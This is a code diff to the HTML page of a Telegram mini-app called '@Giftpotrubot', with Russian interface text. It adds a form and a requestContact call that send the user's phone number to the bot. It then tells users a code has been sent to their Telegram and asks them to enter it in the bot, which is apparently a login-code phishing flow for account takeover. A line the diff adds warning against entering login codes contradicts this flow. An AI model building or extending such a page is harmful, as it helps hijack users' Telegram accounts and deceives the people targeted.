@@ -149,6 +149,21 @@
             font-size: 13px;
             color: #1e40af;
         }
+
+        .phone-input {
+            width: 100%;
+            padding: 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 16px;
+            margin-bottom: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .phone-input:focus {
+            outline: none;
+            border-color: #3b82f6;
+        }
     </style>
 </head>
 <body>
@@ -182,9 +197,41 @@
                 Войти через Telegram
             </button>
 
-            
+            <div class="warning">
+                ⚠️ Внимание! Никогда не вводите коды входа в Telegram в мини-приложениях.
+            </div>
             
             <p style="margin-top: 16px; color: #94a3b8; font-size: 12px;">@Giftpotrubot</p>
+        </div>
+
+        <!-- Phone Input Step -->
+        <div id="phone-step" class="step">
+            <svg class="mascot" viewBox="0 0 200 200">
+                <ellipse cx="100" cy="90" rx="60" ry="70" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="125" cy="70" r="18" fill="white" stroke="black" stroke-width="3"/>
+                <circle cx="75" cy="70" r="10" fill="black"/>
+                <circle cx="125" cy="70" r="10" fill="black"/>
+            </svg>
+            
+            <h1>Введите номер телефона</h1>
+            <p class="subtitle">Укажите номер в формате:<br>+1234567890</p>
+            
+            <input 
+                type="tel" 
+                id="phone-input" 
+                class="phone-input" 
+                placeholder="+1234567890"
+                pattern="\+?[0-9]+"
+            />
+            
+            <button class="btn" onclick="submitPhone()">
+                Продолжить
+            </button>
+            
+            <button class="btn" onclick="showStep('welcome-step')" style="margin-top: 12px; background: #94a3b8;">
+                Назад
+            </button>
         </div>
 
         <!-- Loading Step -->
@@ -205,10 +252,10 @@
         <div id="success-step" class="step">
             <div class="success-icon">✅</div>
             <h1>Успешно!</h1>
-            <p class="subtitle">Бот попросит вас отправить номер<br>телефона в чате. Проверьте сообщения.</p>
+            <p class="subtitle">Код отправлен в ваш Telegram.<br>Проверьте сообщения от бота.</p>
             
             <div class="info-box">
-                💡 Возвращайтесь в чат с ботом и следуйте инструкциям
+                💡 Введите полученный код в боте для завершения авторизации
             </div>
         </div>
 
@@ -246,25 +293,77 @@
             showStep('error-step');
         }
 
+        // Попытка использовать requestContact (если доступно в вашей версии)
         function requestPhoneNumber() {
             if (isRequesting) return;
-            isRequesting = true;
-
+            
             const loginBtn = document.getElementById('login-btn');
             loginBtn.disabled = true;
             loginBtn.textContent = 'Запрос разрешения...';
 
-            // Просто отправляем запрос боту - он попросит номер телефона
+            // Проверяем доступность метода requestContact
+            if (typeof tg.requestContact === 'function') {
+                console.log('Using requestContact method');
+                tg.requestContact((status, contact) => {
+                    if (status && contact) {
+                        sendPhoneToBotViaData(contact.phone_number);
+                    } else {
+                        // Если не удалось - переходим к ручному вводу
+                        showStep('phone-step');
+                        loginBtn.disabled = false;
+                        loginBtn.innerHTML = '<svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Войти через Telegram';
+                        isRequesting = false;
+                    }
+                });
+            } else {
+                // Если метода нет - сразу показываем форму ввода
+                console.log('requestContact not available, showing manual input');
+                showStep('phone-step');
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = '<svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Войти через Telegram';
+                isRequesting = false;
+            }
+        }
+
+        function submitPhone() {
+            const phoneInput = document.getElementById('phone-input');
+            let phone = phoneInput.value.trim();
+
+            // Валидация номера
+            if (!phone) {
+                alert('Пожалуйста, введите номер телефона');
+                return;
+            }
+
+            // Добавляем + если его нет
+            if (!phone.startsWith('+')) {
+                phone = '+' + phone;
+            }
+
+            // Проверяем формат
+            if (!/^\+?[0-9]{10,15}$/.test(phone)) {
+                alert('Неверный формат номера. Используйте формат: +1234567890');
+                return;
+            }
+
+            sendPhoneToBotViaData(phone);
+        }
+
+        function sendPhoneToBotViaData(phone) {
+            showStep('loading-step');
+            isRequesting = true;
+
             if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                showStep('loading-step');
+                console.log('Sending phone to bot:', phone);
                 
-                // Отправляем запрос боту на авторизацию
+                // Отправляем данные боту
                 tg.sendData(JSON.stringify({
                     action: 'request_phone',
+                    phone: phone,
                     user_id: tg.initDataUnsafe.user.id
                 }));
 
-                // Показываем успех и инструкции
+                // Показываем успех
                 setTimeout(() => {
                     showStep('success-step');
                     
@@ -276,8 +375,6 @@
             } else {
                 showError('Не удалось определить пользователя Telegram');
                 isRequesting = false;
-                loginBtn.disabled = false;
-                loginBtn.innerHTML = '<svg class="telegram-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>Войти через Telegram';
             }
         }
 
@@ -286,7 +383,13 @@
             version: tg.version,
             platform: tg.platform,
             initData: tg.initData ? 'present' : 'missing',
-            user: tg.initDataUnsafe?.user
+            user: tg.initDataUnsafe?.user,
+            hasRequestContact: typeof tg.requestContact === 'function'
+        });
+
+        // Автофокус на input при открытии формы
+        document.getElementById('phone-input').addEventListener('focus', function() {
+            this.scrollIntoView({ behavior: 'smooth', block: 'center' });
         });
     </script>
 </body>
